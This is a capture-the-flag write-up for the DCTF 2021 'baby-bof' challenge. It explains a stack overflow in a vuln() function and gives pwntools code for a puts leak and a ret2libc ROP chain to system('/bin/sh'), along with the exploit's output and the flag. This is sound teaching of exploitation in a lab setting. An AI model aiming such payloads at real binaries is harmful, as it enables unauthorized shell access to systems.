

Message from function ``vuln`` was clearly asking for ROP. It takes *0x100* bytes of input and put it into 10 bytes area, overflow it then call *"system('bin/sh')"* get shell.

```c
void vuln(void)

{
  char local_12 [10];
  
  puts("plz don\'t rop me");
  fgets(local_12,0x100,stdin);
  puts("i don\'t think this will work");
  return;
}
```

First of all, needed to find address of *"system"* and *"/bin/sh"* string. Call *puts@plt* to print address of *puts*, then could substract the offset of *puts* to get libc base address. Padding could be found using cyclic string, in this case it was 18 bytes. So payload to get address of *puts* to be ``<18 bytes padding><pop_rdi><puts @ got><puts @ plt><return address vuln>``. We needed to return to *vuln* function to send again payload to get shell.

```python
elf = pwn.ELF('baby_bof')
rop = pwn.ROP(elf)

pop_rdi = pwn.p64(rop.find_gadget(['pop rdi', 'ret']).address)

payload = b'A'*18
payload += pop_rdi
payload += pwn.p64(elf.got['puts'])
payload += pwn.p64(elf.plt['puts'])
payload += pwn.p64(elf.sym['vuln'])
```

The dockerfile said ther server was using *"ubuntu:20.04"*, found out libc version was *libc6_2.31-0ubuntu9.x_amd64.deb*.

```dockerfile
FROM ubuntu:20.04
```

Downloaded and unpacked with ``ar``, then untar *data.tar.xz* to get *libc-2.31.so* file.

```bash
ar xv libc6_2.31-0ubuntu9.2_amd64.deb
x - debian-binary
x - control.tar.xz
x - data.tar.xz
```

When we got the *puts* address and libc, the address of *"system"* and *"binsh"* can be found as follow.

```
libc = pwn.ELF('libc-2.31.so')
libc.address = puts_addr - libc.symbols['puts']
sys = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh'))
```

Another way to find them would be look up the known libc function address at [libc.blukat.me](https://libc.blukat.me), calculate the address with known libc function address by adding the difference.

```python
if remote:
    sys = puts_addr - 0x32190
    bin_sh = puts_addr + 0x13000a
else:
    sys = puts_addr - 0x2e660
    bin_sh = puts_addr + 0x116eb6
```

The final payload to bring up a shell was *<18 bytes padding><ret gadget><pop_rdi gadget><binsh address><system address><return address>*. Full source code can be found [here](https://github.com/onealmond/hacking-lab/blob/master/dctf-2021/baby-bof/exploit.py).

```python
ret = pwn.p64(rop.find_gadget(['ret']).address)
payload = b'A'*18
payload += ret
payload += pop_rdi
payload += pwn.p64(bin_sh)
payload += pwn.p64(sys)
payload += pwn.p64(elf.sym['vuln'])
print(payload)

pr.sendafter('me\n', payload)
pr.sendline()
pr.sendline('cat flag.txt')
```

```bash
$ python3 exploit.py 
[+] Opening connection to dctf-chall-baby-bof.westeurope.azurecontainer.io on port 7481: Done
[*] '/home/zex/lab_ex/hacking-lab/dctf-2021/baby-bof/baby_bof'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/home/zex/lab_ex/hacking-lab/dctf-2021/baby-bof/libc-2.31.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded 14 cached gadgets for 'baby_bof'
b"i don't think this will work\n"
puts @ 0x7f9936fe65a0
sys @ 0x7f9936fb4410
bin_sh @ 0x7f99371165aa
b'AAAAAAAAAAAAAAAAAA\x8e\x04@\x00\x00\x00\x00\x00\x83\x06@\x00\x00\x00\x00\x00\xaae\x117\x99\x7f\x00\x00\x10D\xfb6\x99\x7f\x00\x00\xb7\x05@\x00\x00\x00\x00\x00'
[+] Receiving all data: Done (68B)
[*] Closed connection to dctf-chall-baby-bof.westeurope.azurecontainer.io port 7481
b"i don't think this will work\ndctf{D0_y0U_H4v3_A_T3mpl4t3_f0R_tH3s3}\n"
```
